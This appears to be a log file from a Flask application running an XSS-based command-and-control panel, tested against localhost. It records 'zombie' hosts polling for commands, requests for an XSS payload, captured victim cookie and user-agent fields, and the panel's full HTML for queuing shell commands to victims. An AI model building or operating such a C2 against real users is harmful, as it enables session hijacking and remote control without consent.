2025-06-25 11:25:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 11:25:11 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 11:25:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 11:25:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:11] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 11:25:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 11:25:11 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 11:25:11 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T03:25:11.632Z"}', None, '2025-06-25 11:25:11.634885', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 11:25:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 11:25:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:11] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 11:25:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:25:11 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:25:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0014s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:25:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:11] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:25:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:12 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:13 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:14 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:15 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:17 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:18 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:25:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:25:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 11:25:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:25:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:25:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
